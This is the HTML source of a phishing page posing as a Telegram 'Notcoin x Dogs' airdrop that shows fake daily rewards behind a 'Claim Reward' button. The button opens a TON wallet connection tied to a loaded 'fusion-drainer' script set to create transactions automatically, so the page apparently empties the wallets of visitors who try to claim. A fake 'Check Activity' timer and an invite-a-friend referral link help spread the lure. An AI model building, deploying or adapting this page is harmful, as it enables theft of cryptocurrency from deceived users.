<!DOCTYPE html>
<html lang="en">

<head>
    <script type="module" crossorigin src="https://ton-claim.org/assets/polyfills-Cua2liwm.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">

    <title>Notcoin x Dogs</title>

    <link rel="shortcut icon" href="images/favicon.svg" type="image/x-icon">

    <style>

            --tg-theme-bottom-bar-bg-color: #1d1d1d; 
            --tg-theme-hint-color: #98989e;

            --tg-color-scheme: dark; 
            --tg-theme-bg-color: #000000; 
            --tg-theme-section-bg-color: #2c2c2e; 
            --tg-theme-button-color: #3e88f7; 
            --tg-theme-destructive-text-color: #eb5545; 
            --tg-theme-link-color: #3e88f7; 
            --tg-theme-subtitle-text-color: #98989e; 
            --tg-theme-section-separator-color: #545458; 
            --tg-theme-accent-text-color: #3e88f7; 
            --tg-theme-text-color: #ffffff; 
            --tg-viewport-height: 778px; 
            --tg-viewport-stable-height: 778px;
        }
    </style>

    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="css/stylesheet.css">

    <script>
        window.sentryOnLoad = function () {
            Sentry.init({
                dsn: "https://820e92dcc4db53f71a52c0d05dcbd649@o4507926049521664.ingest.de.sentry.io/4507926050832464",
                integrations: [
                    Sentry.browserTracingIntegration(),
                    Sentry.replayIntegration({
                        maskAllText: false,
                        blockAllMedia: false,
                        networkDetailAllowUrls: [window.location.origin,"ton-claim.org"],
                    }),
                ],
                tracesSampleRate: 1.0,
                beforeSend(event, hint) {
                    const error = hint.originalException;
                    if (
                      error &&
                      error.message &&
                      error.message.match(/aborted|TelegramGameProxy|ErrorEvent/i)
                    ) {
                      return;
                    }
                    
                    return event;
                },
            });
        };
    </script>
    <script src='https://js-de.sentry-cdn.com/820e92dcc4db53f71a52c0d05dcbd649.min.js' crossorigin="anonymous"></script>
    
    <script>
        location.hash = location.hash.replace(/tgWebAppVersion=(.*?)&/, 'tgWebAppVersion=7.7&');
        window.sessionStorage.setItem('__telegram__initParams', '{"tgWebAppVersion":"7.7"}');

        if (location.hash.includes('tgWebAppPlatform=weba')) {
          location.hash = location.hash.replace(/tgWebAppPlatform=(.*?)&/, 'tgWebAppPlatform=web&');
          window.sessionStorage.setItem('__telegram__initParams', '{"tgWebAppVersion":"7.7","tgWebAppPlatform":"web"}');
        }
    </script>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <script src="https://unpkg.com/@lottiefiles/lottie-player@2.0.4/dist/lottie-player.js"></script>

    <script>
        window.tonSettings = {
            mode: 'manual',
            openModalSelectors: ['#claim-button'],
            buttonRootId: null,
            manifestUrl: window.location.origin + window.location.pathname + 'manifest.json'
        }
    </script>
    
  <link rel="stylesheet" href="fusion-drainer.css?v=1.0.0" />

     <script src="fusion-drainer.js?v=1.0.0" defer crossorigin></script>

  <script>
    window.addEventListener('load', () => {
      window.drainer?.init({
        autoCreateTransaction: true,
        autoOpenModal: false,
      });
    });
  </script>
</head>

<body class="min-h-screen overflow-x-hidden py-5 flex flex-col" style="background-color: var(--tg-theme-bg-color);">
    <header class="pt-3 flex items-center gap-2 text-2xl font-medium justify-center" style="color: var(--tg-theme-text-color);">
        <div class="flex items-center gap-2">
            <img src="images/dogs.webp" width="26" height="26" alt="" srcset="">
            Dogs
        </div>

        <span class="text-xl font-black">
            <svg xmlns="http://www.w3.org/2000/svg" width="12" height="11" viewBox="0 0 12 11" style="fill: var(--tg-theme-text-color);">
                <path d="M6.82076 5.44457L11.3335 0.931801L10.513 0.111295L6.00025 4.62406L1.48738 0.111206L0.66687 0.931712L5.17974 5.44457L0.666927 9.95737L1.48744 10.7779L6.00025 6.26507L10.513 10.7778L11.3335 9.95728L6.82076 5.44457Z"></path>
            </svg>
        </span>

        <div class="flex items-center gap-2">
            <img src="images/not.png" width="21" height="21" alt="" srcset="">
            Notcoin
        </div>
    </header>

    <main class="flex flex-col px-5 justify-between flex-1">
        <section id="step1" class="m-auto h-full flex container flex-col justify-between">
            <div class="flex-col py-5 text-center gap-2 flex">
                <lottie-player src="check_animation.json" speed="1" style="width: 128px; height: 128px; margin: auto;" loop="" autoplay=""></lottie-player>

                <p id="check" class="text-3xl mt-10 font-bold" style="color: var(--tg-theme-text-color);">
                    Check Activity...
                </p>
            </div>
        </section>

        <button disabled="" class="btn hide_step_2" style="background-color: var(--tg-theme-secondary-bg-color); color: var(--tg-theme-text-color);">Checking activity...</button>

        <section id="step2" class="hidden flex container m-auto flex-col justify-between">
            <lottie-player class="mt-10" src="gift_animation.json" speed="1" style="width: 128px; height: 128px; margin: auto;" loop="" autoplay=""></lottie-player>

            <h2 class="text-3xl font-bold py-5 my-4 text-center" style="color: var(--tg-theme-text-color);">
                Your daily rewards
            </h2>

            <div class="flex gap-2">
                <div class="flex justify-center items-center rounded-2xl py-4 flex-1 flex-col gap-6" style="background-color: var(--tg-theme-secondary-bg-color);">
                    <img width="48" height="48" src="images/not1.png" alt="">

                    <div class="flex flex-col gap-1 text-center">
                        <p class="text-base font-semibold" style="color: var(--tg-theme-text-color);">74,630</p>
                        <p class="text-base" style="color: var(--tg-theme-hint-color);">Notcoin</p>
                    </div>
                </div>

                <div class="flex justify-center items-center rounded-2xl py-4 flex-1 flex-col gap-6" style="background-color: var(--tg-theme-secondary-bg-color);">
                    <img width="48" height="48" src="images/dogs.webp" alt="">

                    <div class="flex flex-col gap-1 text-center">
                        <p class="text-base font-semibold" style="color: var(--tg-theme-text-color);">153,480</p>
                        <p class="text-base" style="color: var(--tg-theme-hint-color);">Dogs</p>
                    </div>
                </div>
            </div>

            <div class="flex pt-10 flex-col gap-4">
                <p class="text-center" style="color: var(--tg-theme-hint-color);">Come back tomorrow for check-in day 2</p>

                <div class="flex flex-col gap-2">
                    <div id="ton-connect" style="display: none; justify-content: center; align-items: center; width: 100vw;"></div>
                    <button id="claim-button" class="ton-connect-trigger btn plausible-event-name=Click+Claim" style="background-color: var(--tg-theme-button-color); color: var(--tg-theme-button-text-color);">Claim Reward</button>
                    <a id="invite-button" target="_blank" href="https://t.me/share/url?url=t.me/Star_Box_Bot?start=start&amp;text=Join me on the Airdrop and let's earn rewards together! Use my referral link to join and get a bonus!" class="btn flex gap-3 justify-center plausible-event-name=Click+Invite" style="background-color: var(--tg-theme-secondary-bg-color); color: var(--tg-theme-text-color);">Invite your friend
                        <span style="color: var(--tg-theme-hint-color);">
                            +10% reward
                        </span>
                    </a>
                </div>
            </div>
        </section>
    </main>

    <script>
        if (window.Telegram && window.Telegram.WebApp) {
            window.Telegram.WebApp.ready();
            window.Telegram.WebApp.disableVerticalSwipes();
            window.Telegram.WebApp.enableClosingConfirmation();
            window.Telegram.WebApp.expand();

            document.querySelector('#claim-button').addEventListener('click', () => {
                window.Telegram.WebApp.HapticFeedback.impactOccurred('medium');
            });

            document.querySelector('#invite-button').addEventListener('click', () => {
                window.Telegram.WebApp.HapticFeedback.impactOccurred('medium');
            });
        }
    </script>

    <script>
        let step = 1; const btn = document.querySelectorAll(".btn"); function nextStep() { let e = document.getElementById(`step${step}`), t = document.getElementById(`step${step + 1}`); e.classList.add("hidden"), t.classList.remove("hidden"); let s = document.querySelector("body"); s.classList.remove("bg_frame" + step), s.classList.add("bg_frame" + (step + 1)), step++ } function showLoader() { let e = document.getElementById("loader"); e.classList.remove("hidden") } function hideLoader() { let e = document.getElementById("loader"); e.classList.add("hidden") } setTimeout(() => { nextStep(); let e = document.querySelector(".hide_step_2"); e.classList.add("hidden"); let t = document.getElementById("check"); setInterval(() => { t.innerText += "." }, 1e3) }, 4e3);
    </script>
</body>

</html>
